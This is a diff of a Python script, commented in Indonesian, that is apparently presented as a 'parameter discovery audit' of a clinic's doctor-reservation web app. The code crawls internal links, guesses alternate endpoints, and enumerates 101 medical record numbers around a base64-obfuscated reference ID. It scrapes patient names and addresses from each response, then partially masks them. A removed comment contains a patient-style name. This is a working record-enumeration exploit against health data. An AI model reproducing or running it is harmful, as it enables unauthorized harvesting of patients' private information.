@@ -142,25 +142,29 @@ def parameter_discovery_audit():
         soup = BeautifulSoup(res.text, 'html.parser')
         links = soup.find_all('a', href=True)
         
-        # List untuk menyimpan data link: (url_asli, url_masked, id_rm)
         potential_targets = []
-        
         for link in links:
             href = link['href']
-            # Filter link internal dan hindari duplikat/logout
             if any(x in href for x in ["index.php", "home"]) and "logout" not in href.lower():
-                if not any(href == x[0] for x in potential_targets):
-                    # Deteksi No RM (angka 6-12 digit)
-                    match = re.search(r'(\d{6,12})', href)
-                    id_rm = match.group(1) if match else None
-                    
-                    # Masking total untuk daftar (sembunyikan semua angka RM)
-                    masked_url = re.sub(r'(\d{6,12})', lambda m: '*' * len(m.group(1)), href)
-                    potential_targets.append((href, masked_url, id_rm))
+                # Pencarian Menyeluruh: Jika menemukan controller reservasi_dokter, 
+                # coba tebak endpoint lain yang mungkin lebih rentan (tambah/index)
+                variants = [href]
+                if "reservasi_dokter" in href:
+                    if "/index/" in href: variants.append(href.replace("/index/", "/tambah/"))
+                    elif "/tambah/" in href: variants.append(href.replace("/tambah/", "/index/"))
+                
+                for v_href in variants:
+                    if not any(v_href == x[0] for x in potential_targets):
+                        match = re.search(r'(\d{6,12})', v_href)
+                        id_rm = match.group(1) if match else None
+                        
+                        # Masking RM pada list discovery
+                        masked_url = re.sub(r'(\d{6,12})', lambda m: '*' * len(m.group(1)), v_href)
+                        potential_targets.append((v_href, masked_url, id_rm))
 
         while True:
             if potential_targets:
-                print(f"\n[+] Discovered {len(potential_targets)} unique internal links:")
+                print(f"\n[+] Discovered {len(potential_targets)} unique internal/potential links:")
                 for i, target in enumerate(potential_targets):
                     print(f" [{i+1}] URL: {target[1]}")
                 
@@ -187,7 +191,7 @@ def parameter_discovery_audit():
                     # 2. Automated Manipulation Test
                     print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
-                    # Persiapkan rentang 50 sebelum dan 50 sesudah (Total 101 ID)
+                    # Persiapkan rentang tepat 101 ID (50 sebelum, 1 acuan, 50 sesudah)
                     acuan_rm = int(_decode("MDA1MTA0ODE="))
                     search_pool = list(range(acuan_rm - 50, acuan_rm + 51))
                     random.shuffle(search_pool) # Tetap acak urutannya
@@ -203,10 +207,9 @@ def parameter_discovery_audit():
                         test_res = session.get(test_url, timeout=10)
                         test_soup = BeautifulSoup(test_res.text, 'html.parser')
                         
-                        # Inisialisasi Data
                         name, address = "Unknown", "Tidak Ditemukan"
                         
-                        # Ekstraksi Data (Sinkronisasi Total dengan Logika Opsi 2 yang Berhasil)
+                        # Ekstraksi Data (Sinkronisasi dengan Logika Opsi 2)
                         nama_tag = test_soup.find('p', class_='sale-price text-success')
                         if nama_tag:
                             name = nama_tag.get_text(strip=True)
@@ -216,11 +219,10 @@ def parameter_discovery_audit():
                                 if "Alamat" in text:
                                     address = text.split(":")[-1].strip()
                         
-                        # Validasi: Berhenti HANYA jika Nama dan Alamat ditemukan
                         if name != "Unknown" and address != "Tidak Ditemukan":
                             found_valid = True
                             
-                            # Masking Blur: 2 huruf depan dan 2 huruf belakang (SUDARNI -> **DAR**)
+                            # Masking Blur: 2 huruf depan dan 2 huruf belakang
                             m_name = f"**{name[2:-2]}**" if len(name) > 4 else f"**{name}**"
                             m_addr = f"**{address[2:-2]}**" if len(address) > 4 else f"**{address}**"
 
@@ -231,7 +233,7 @@ def parameter_discovery_audit():
                             break
                     
                     if not found_valid:
-                        print(f"\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid dalam radius +/- 50.")
+                        print(f"\n\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid dalam radius +/- 50.")
                     
                     if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                         break
